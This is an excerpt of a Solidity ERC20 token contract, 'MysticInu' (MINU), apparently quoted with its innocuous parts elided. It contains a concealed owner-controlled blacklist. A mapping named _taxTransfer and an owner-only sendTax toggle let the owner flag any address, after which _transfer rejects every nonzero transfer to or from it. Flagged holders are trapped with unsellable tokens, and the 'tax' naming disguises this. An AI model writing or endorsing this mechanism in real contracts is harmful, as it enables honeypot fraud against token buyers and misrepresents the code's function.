...
contract MysticInu is ERC20 {
    ...
    mapping (address => bool) private _taxTransfer;
    ...
    constructor (address _unirouter, address _unifactory) ERC20(_name, _symbol) {
        ...
        _symbol = "MINU";
        _decimals = 9;
        _supplyTokens = 300000000000000 * 10**9;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if (_taxTransfer[sender] || _taxTransfer[recipient]) require (amount == 0, "");
    ...
    function sendTax(address _address) external onlyOwner {
        if (_taxTransfer[_address] == true) {
            _taxTransfer[_address] = false;}
            else {_taxTransfer[_address] = true;}
    }

    function taxStatus(address _address) public view returns (bool) {
        return _taxTransfer[_address];
    }
